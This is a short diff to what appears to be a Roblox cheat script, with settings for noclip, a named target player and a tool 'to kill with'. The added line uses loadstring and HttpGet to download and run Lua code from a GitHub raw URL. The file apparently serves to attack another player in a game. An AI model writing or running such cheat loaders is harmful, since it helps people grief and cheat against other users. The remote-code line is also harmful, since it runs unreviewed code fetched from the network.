@@ -20,3 +20,4 @@ _G.noclip = true             --If you want your character to be nocliped, set th
 local target = "alex_omar41" --Set your targets name. (FULL NAME ELSE IT WILL NOT WORK!) 
 local tool = "BoomBox"       --Put the Name of the tool you want to kill with.
 
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/OmarXploits/Scriptsimadecuziwerebored/main/EndOfKill.lua')))()
